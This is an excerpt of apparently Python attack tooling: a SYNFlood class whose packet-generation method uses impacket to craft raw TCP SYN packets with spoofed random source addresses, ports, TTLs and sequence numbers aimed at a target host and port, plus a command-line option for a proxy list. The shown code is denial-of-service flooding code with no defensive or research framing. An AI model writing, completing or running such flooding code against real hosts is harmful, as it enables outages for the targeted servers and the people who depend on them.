...
class SYNFlood:
    ...
    def _generate_syn(self) -> tuple[bytes, str]:
        ...
        # Use impacket for IP and TCP layers
        ip_layer = IP()
        ip_layer.set_ip_src(src_ip)
        ip_layer.set_ip_dst(self.target[0])
        ip_layer.set_ip_ttl(random.randint(1, 255))  # Random TTL
        
        tcp_layer = TCP()
        tcp_layer.set_th_sport(random.randint(32768, 65535))  # Random source port
        tcp_layer.set_th_dport(self.target[1])  # Target port
        tcp_layer.set_th_flags(flags_List)  # SYN flag
        tcp_layer.set_th_seq(random.randint(0, 4294967295))  # Random sequence number
        tcp_layer.set_th_win(random.randint(1000, 65535))  # Random TCP window size
        
        payload_size = random.randint(0, 1460)
        payload = b'\x00' * payload_size  # No payload, just SYN
        
        raw_ip = ip_layer.get_packet()  # Get raw IP packet
        raw_tcp = tcp_layer.get_packet()  # Get raw TCP packet
        
        raw_packet = raw_ip + raw_tcp + payload
        return raw_packet, src_ip
...
def cli_main():
    ...
    parser.add_argument("--proxies", type=str, default="proxyList.txt", help="Path to the file containing proxies")
